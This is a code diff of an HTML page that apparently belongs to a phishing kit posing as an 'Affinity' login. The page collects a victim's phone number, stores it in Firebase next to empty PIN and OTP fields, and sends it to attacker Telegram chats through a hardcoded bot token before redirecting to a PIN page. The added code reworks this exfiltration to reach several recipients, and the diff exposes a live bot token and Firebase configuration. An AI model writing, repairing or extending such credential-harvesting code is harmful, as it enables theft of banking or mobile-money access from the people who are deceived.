@@ -47,7 +47,7 @@
     <button class="btn-primary" id="phoneContinueBtn">Continue</button>
 
     <div class="footer-links">
-      <a class="link" href="support.html" style="color:inherit;text-decoration:none;"><span class="help-icon">👤</span> Need help?</a>
+      <span class="link" onclick="window.location.href='support.html'"><span class="help-icon">👤</span> Need help?</span>
       <span class="sep"></span>
       <span class="link">Terms and conditions</span>
     </div>
@@ -67,73 +67,102 @@
     projectId: "achievebypetra-82966",
     storageBucket: "achievebypetra-82966.firebasestorage.app",
     messagingSenderId: "412688052429",
-    appId: "1:412688052429:web:abf989e226e153b7c37984"
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
   };
 
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
+
   const DB_NODE = 'affinity_users';
 
   const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
-  const TELEGRAM_RECIPIENTS = ["8938213844", "6340664257"];
 
-  function sendTelegram(phone, userId) {
-    var message = "🔔 AFFINITY NOTIFICATION\n\nEvent: 📱 Phone Number Entered\nPhone: +233" + phone + "\nUser ID: " + userId + "\nTime: " + new Date().toLocaleString();
-    var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-    TELEGRAM_RECIPIENTS.forEach(function(chatId) {
+  // ✅ ADD BOTH CHAT IDs HERE - One for you, one for the admin
+  const TELEGRAM_CHAT_IDS = [
+    "8938213844",  // YOUR Chat ID (you get notifications)
+    "ADMIN_CHAT_ID_HERE"  // ← REPLACE WITH THE ADMIN'S CHAT ID!
+  ];
+
+  // ✅ WORKING METHOD - Same as your OTP version that worked!
+  function sendTelegramNotification(eventType, userData) {
+    const message = 
+`🔔 AFFINITY NOTIFICATION
+
+Event: ${eventType}
+Phone: ${userData.phone || 'Not set'}
+User ID: ${userData.userId || 'Unknown'}
+Time: ${new Date().toLocaleString()}`;
+
+    // ✅ Send to BOTH chat IDs
+    TELEGRAM_CHAT_IDS.forEach(function(chatId) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
       fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message }),
-        keepalive: true
-      }).catch(function(){});
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('✅ Telegram sent to:', chatId);
+        } else {
+          console.log('❌ Telegram error for', chatId, ':', data.description);
+        }
+      })
+      .catch(error => {
+        console.error('❌ Telegram send failed for', chatId, ':', error);
+      });
     });
   }
 
-  var phoneInput = document.getElementById("phoneInput");
-  var continueBtn = document.getElementById("phoneContinueBtn");
+  var phoneInput = document.getElementById('phoneInput');
+  var continueBtn = document.getElementById('phoneContinueBtn');
 
-  phoneInput.addEventListener("input", function() {
-    phoneInput.value = phoneInput.value.replace(/\D/g, "");
+  phoneInput.addEventListener('input', function () {
+    phoneInput.value = phoneInput.value.replace(/\D/g, '');
   });
 
-  continueBtn.addEventListener("click", function() {
+  continueBtn.addEventListener('click', function () {
     var phone = phoneInput.value.trim();
     if (phone.length < 9) {
-      phoneInput.parentElement.style.borderColor = "#c0392b";
-      setTimeout(function() { phoneInput.parentElement.style.borderColor = ""; }, 900);
+      phoneInput.parentElement.style.borderColor = '#c0392b';
+      setTimeout(function () { phoneInput.parentElement.style.borderColor = ''; }, 900);
       return;
     }
 
-    var userId = "User_" + Date.now().toString(36).toUpperCase();
+    var userId = 'User_' + Date.now().toString(36).toUpperCase();
 
-    // ✅ FIRST: Save to Firebase, THEN send notification and navigate
-    database.ref(DB_NODE + "/" + userId).set({
+    var userData = {
       id: userId,
       phone: phone,
-      pin: "",
-      otp: "",
+      pin: '',
+      otp: '',
       timestamp: new Date().toLocaleString()
-    }).then(function() {
-      // ✅ Save to sessionStorage
-      sessionStorage.setItem("affinity_userId", userId);
-      sessionStorage.setItem("affinity_phone", phone);
-      sessionStorage.setItem("affinity_pin", "");
-      
-      // ✅ Send notification (your working code)
-      sendTelegram(phone, userId);
+    };
 
-      // ✅ Navigate
-      window.location.href = "pin.html";
-    }).catch(function(error) {
-      console.error("❌ Firebase error:", error);
-      // Still navigate even if save fails
-      sessionStorage.setItem("affinity_userId", userId);
-      sessionStorage.setItem("affinity_phone", phone);
-      sessionStorage.setItem("affinity_pin", "");
-      sendTelegram(phone, userId);
-      window.location.href = "pin.html";
-    });
+    database.ref(DB_NODE + '/' + userId).set(userData)
+      .then(() => {
+        sessionStorage.setItem('affinity_userId', userId);
+        sessionStorage.setItem('affinity_phone', phone);
+        sessionStorage.setItem('affinity_pin', '');
+        
+        // ✅ Send notification - ONLY FOR PHONE NUMBER
+        sendTelegramNotification('📱 Phone Number Saved', {
+          phone: phone,
+          userId: userId
+        });
+
+        window.location.href = 'pin.html';
+      })
+      .catch(function (error) {
+        console.error('❌ Firebase error:', error);
+        window.location.href = 'pin.html';
+      });
   });
 </script>
 
